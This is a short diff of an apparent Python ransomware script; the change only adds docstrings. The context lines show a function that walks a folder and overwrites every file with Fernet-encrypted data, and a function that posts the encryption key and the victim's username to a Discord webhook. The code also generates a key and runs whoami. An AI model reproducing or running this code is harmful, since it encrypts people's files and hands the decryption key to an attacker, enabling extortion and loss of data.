@@ -5,6 +5,7 @@ import subprocess
 import json
 
 
+"""Cipher function"""
 def cyp_folder(path, fernet):
     for root, files in os.walk(path):
         for filename in files:
@@ -20,6 +21,7 @@ def cyp_folder(path, fernet):
                 f.write(encrypted_data)
 
 
+"""Send the key used for encryption"""
 def send_key(username, key, discord_webhook_url):
     message = {
         "username": f"{username}",
@@ -29,6 +31,7 @@ def send_key(username, key, discord_webhook_url):
     requests.post(discord_webhook_url, data=message_json, headers={'Content-Type': 'application/json'})
 
 
+"""Just some variables"""
 KEY = Fernet.generate_key()
 FERNET = Fernet(KEY)
 USERNAME = subprocess.check_output(['whoami']).decode('ascii')
